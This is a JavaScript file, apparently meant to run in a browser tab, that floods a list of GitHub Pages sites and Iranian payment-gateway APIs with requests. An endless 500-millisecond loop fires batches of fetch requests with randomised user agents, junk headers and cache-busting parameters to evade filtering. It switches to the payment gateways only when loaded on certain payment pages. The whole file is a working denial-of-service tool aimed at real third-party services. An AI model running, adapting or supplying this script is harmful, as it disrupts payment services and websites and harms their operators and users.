(function() {
    'use strict';

    const urls = [
        "https://itgoyo.github.io/",
        "https://ipg.novinopay.com/StartPay/812F739E41057BAC22331918CD5B41C2",
        "https://supertux.github.io/",
        "https://facebookincubator.github.io/",
        "https://try.github.io/",
        "https://core.paystar.ir/api/open-banking/application/refresh-api-key",
        "https://ubg98.github.io/",
        "https://adsabs.github.io/",
        "https://codefornepal.github.io/",
        "https://hoorpay.ir/webservice/rest/PaymentRequest",
        "https://adr.github.io/",
        "http://geteduroam.github.io/",
        "https://api.jibimo.com/v2/auth/token",
        "https://gedoor.github.io/",
        "https://x-delete.github.io/",
        "https://imagej.github.io/",
        "https://dargaah.com/payment",
        "https://pencil2d.github.io/",
        "https://siddhss5.github.io/",
        "https://apereo.github.io/",
        "https://ckeditor5.github.io/",
        "https://manjaro.github.io/",
        "https://core.inopal.ir/api/pardakht/payment",
        "http://webpack.github.io/",
        "https://shanzhenren.github.io/",
        "https://argoproj.github.io/",
        "https://gateway.zibal.ir/v1/request",
        "https://spring-cloud.github.io/",
        "http://understrap.github.io/",
        "https://pagehelper.github.io/",
        "https://pnp.github.io/",
        "https://uber.github.io/",
        "https://seleniumhq.github.io/",
        "http://pa11y.github.io/",
        "https://nextpay.org/nx/gateway/payment/",
        "https://oracle.github.io/",
        "https://microsoft.github.io/",
        "https://azure.github.io/",
        "https://qifenglou.github.io/",
        "https://liblouis.github.io/",
        "https://kazemai.github.io/",
        "https://nerfies.github.io/",
        "https://svc955.github.io/",
        "https://daattali.github.io/",
        "https://ray-project.github.io/",
        "http://marzeelabs.github.io/",
        "https://acmsigsoft.github.io/",
        "https://napneko.github.io/",
        "https://latex3.github.io/",
        "http://twbs.github.io/",
        "https://qupath.github.io/",
        "https://bootstrapbrasil.github.io/",
        "https://collectionbuilder.github.io/",
        "https://pms.rayanpay.com/api/v2/ipg/paymentrequest",
        "https://tmux.github.io/",
        "https://pinterest.github.io/",
        "https://psappdeploytoolkit.github.io/",
        "https://chatsecure.github.io/",
        "http://msys2.github.io/",
        "https://sepal.ir/api/request.json",
        "https://api.tabapay.ir/v1/create",
        "https://tropy.github.io/",
        "https://puplork.github.io/",
        "https://osmlatam.github.io/",
        "https://feitutv.github.io/",
        "https://tqdm.github.io/",
        "https://broadinstitute.github.io/",
        "https://huashequ.github.io/",
        "https://polam.io/invoice/request",
        "http://thingsboard.github.io/",
        "http://mockito.github.io/",
        "http://viraltexts.github.io/",
        "https://ugurcanvurgun.github.io/",
        "http://merchant.shepa.com/",
        "https://scipy.github.io/",
        "https://eightmedia.github.io/",
        "https://fabricjs.github.io/",
        "https://panel.aqayepardakht.ir/api/v2/create",
        "https://alicevision.github.io/",
        "http://pradyunsg.github.io/",
        "https://gnhustgames.github.io/",
        "https://sepordeh.com/merchant/invoices/add/",
        "https://thomas930.github.io/",
        "https://lazyvim.github.io/",
        "https://geneontology.github.io/",
        "https://mlco2.github.io/",
        "https://valve.github.io/",
        "https://select2.github.io/",
        "https://pmd.github.io/",
        "https://webbluetoothcg.github.io/",
        "https://paanapardakht.com/webservice/rest/PaymentRequest",
        "https://xpqiu.github.io/",
        "https://ipg.vandar.io/api/v4/send",
        "https://developer-autodesk.github.io/",
        "https://w3c.github.io/",
        "https://ultralytics.github.io/",
        "https://pjecz.github.io/",
        "https://autoglass-cdn.github.io/",
        "https://gabrielecirulli.github.io/",
        "http://iris-hep.github.io/",
        "https://octokit.github.io/",
        "https://smilingzero.github.io/",
        "https://actix.github.io/",
        "https://kindlemodding.github.io/",
        "https://ng-zorro.github.io/",
        "https://google.github.io/",
        "https://battlecatsinfo.github.io/",
        "https://api.parspal.com/v1/",
        "https://say-can.github.io/",
        "https://qwenlm.github.io/",
        "https://nacos-group.github.io/",
        "https://2i2c-org.github.io/",
        "https://unetbootin.github.io/",
        "https://indico.github.io/",
        "https://ooni.github.io/"
    ];

    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0",
        "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/116.0 Firefox/116.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0",
        "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
    ];

    const allowedUrls = [
        "https://ipg.novinopay.com/StartPay/812F739E41057BAC22331918CD5B41C2",
        "https://pms.rayanpay.com/api/v2/ipg/paymentrequest",
        "https://api.parspal.com/v1/",
        "https://nextpay.org/nx/gateway/payment/",
        "https://core.inopal.ir/api/pardakht/payment",
        "https://dargaah.com/payment",
        "https://hoorpay.ir/webservice/rest/PaymentRequest",
        "https://core.paystar.ir/api/open-banking/application/refresh-api-key",
        "https://noyanpay.ir/",
        "https://polam.io/invoice/request",
        "https://ipg.vandar.io/api/v4/send",
        "https://panel.aqayepardakht.ir/api/v2/create"
    ];

    const generateRandomString = () => (Math.random() + 1).toString(36).substring(2);

    const createRequestOptions = (url, addSearchParams = true) => {
        const headers = {
            "Content-Type": "application/json",
            "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
            "X-Request-ID": generateRandomString(),
            "X-Custom-Time": Date.now().toString(),
            "Accept": Math.random() > 0.5 ? "text/html" : "application/json",
            [generateRandomString()]: generateRandomString(),
            [generateRandomString()]: generateRandomString(),
            [generateRandomString()]: generateRandomString()
        };
        const searchParams = addSearchParams ? new URLSearchParams({
            t: generateRandomString(),
            r: generateRandomString(),
            [generateRandomString()]: generateRandomString(),
            [generateRandomString()]: generateRandomString(),
            [generateRandomString()]: generateRandomString()
        }).toString() : "";
        return {
            method: Math.random() > 0.7 ? "HEAD" : "GET",
            mode: "no-cors",
            headers,
            ...(searchParams && { searchParams })
        };
    };

    const sendRequest = async (url) => {
        try {
            const response = await fetch(url.href || url, createRequestOptions(url));
            console.log(`OK: ${url}`);
            return response;
        } catch (error) {
            console.log(`ERR: ${url} - ${error.message}`);
            return null;
        }
    };

    const runCycle = async () => {
        const selectedUrls = [];
        const count = Math.floor(Math.random() * 6) + 5;
        const currentUrl = window.location.href.toLowerCase();
        const targetUrls = (currentUrl.includes('zarinpal.com') || currentUrl.includes('sep.shaparak.ir')) ? allowedUrls : urls;

        for (let i = 0; i < count; i++) {
            selectedUrls.push(targetUrls[Math.floor(Math.random() * targetUrls.length)]);
        }
        await Promise.all(selectedUrls.map(url => sendRequest(url)));
    };

    const startInfiniteLoop = () => {
        setInterval(() => {
            runCycle().catch(error => {
                console.error("Cycle error:", error);
            });
        }, 500);
    };

    startInfiniteLoop();
})();
